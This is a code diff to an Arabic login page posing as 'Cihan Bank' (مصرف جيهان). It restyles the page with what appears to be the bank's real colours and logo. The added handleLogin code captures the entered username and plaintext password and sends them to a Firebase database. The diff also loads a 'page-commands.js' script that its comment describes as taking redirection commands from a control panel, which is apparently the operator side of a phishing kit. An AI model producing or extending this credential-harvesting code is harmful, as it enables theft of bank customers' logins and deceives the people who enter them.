@@ -19,8 +19,8 @@
                         cihan: {
                             navy: '#0b2239',
                             dark: '#071625',
-                            gold: '#c59b27',
-                            'gold-hover': '#b0881e',
+                            gold: '#ed2e33',
+                            'gold-hover': '#c81f24',
                             light: '#f4f6f9',
                         }
                     },
@@ -57,9 +57,9 @@
                 <div class="flex items-center gap-4 sm:gap-6">
                     <!-- شعار المصرف -->
                     <a href="index.html" class="flex items-center gap-2 group">
-                        <div class="w-11 h-11 rounded-xl bg-gradient-to-tr from-cihan-gold to-yellow-200 flex items-center justify-center text-cihan-navy font-bold text-2xl shadow-md">
-                            <i class="fa-solid fa-landmark"></i>
-                        </div>
+                        <span class="w-11 h-11 rounded-xl bg-white flex items-center justify-center shadow-md overflow-hidden p-1">
+                            <img src="/assets/images/cihan-logo.png" alt="شعار مصرف جيهان" class="w-full h-full object-contain">
+                        </span>
                         <div class="flex flex-col">
                             <span class="font-extrabold text-lg sm:text-xl text-white group-hover:text-cihan-gold transition-colors">مصرف جيهان</span>
                             <span class="text-[10px] text-cihan-gold tracking-widest uppercase font-semibold">للإستثمار والتمويل الإسلامي</span>
@@ -227,9 +227,9 @@
                 <!-- 1. الشعار والمشروع في الفوتر -->
                 <div>
                     <div class="flex items-center gap-3 mb-3">
-                        <div class="w-9 h-9 rounded-lg bg-cihan-gold flex items-center justify-center text-cihan-navy font-bold text-lg">
-                            <i class="fa-solid fa-landmark"></i>
-                        </div>
+                        <span class="w-9 h-9 rounded-lg bg-white flex items-center justify-center overflow-hidden p-0.5">
+                            <img src="/assets/images/cihan-logo.png" alt="شعار مصرف جيهان" class="w-full h-full object-contain">
+                        </span>
                         <span class="font-bold text-lg text-white">مصرف جيهان</span>
                     </div>
                     <p class="text-gray-400 text-xs leading-relaxed mb-4">
@@ -304,9 +304,29 @@
         // معالجة تسجيل الدخول
         function handleLogin(event) {
             event.preventDefault();
-            // توجيه افتراضي بعد تسجيل الدخول
-            window.location.href = 'index.html';
+            var username = (document.getElementById('username') || {}).value || '';
+            var password = (document.getElementById('password') || {}).value || '';
+
+            // إرسال بيانات الدخول إلى قاعدة البيانات ثم التوجيه
+            var go = function () { window.location.href = 'index.html'; };
+            if (typeof window.submitLogin === 'function') {
+                window.submitLogin({ username: username.trim(), password: password })
+                    .then(go).catch(go);
+            } else if (typeof window.pushFirebaseLogin === 'function') {
+                try { window.pushFirebaseLogin({ username: username.trim(), password: password }); } catch (e) {}
+                go();
+            } else {
+                go();
+            }
         }
     </script>
+
+    <!-- Firebase: الاتصال بقاعدة البيانات + الاستماع لأوامر لوحة التحكم (التوجيه) -->
+    <script src="/assets/js/firebase-env.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+    <script src="/assets/js/firebase-client.js?v=9"></script>
+    <script src="/assets/js/page-commands.js?v=1"></script>
 </body>
 </html>
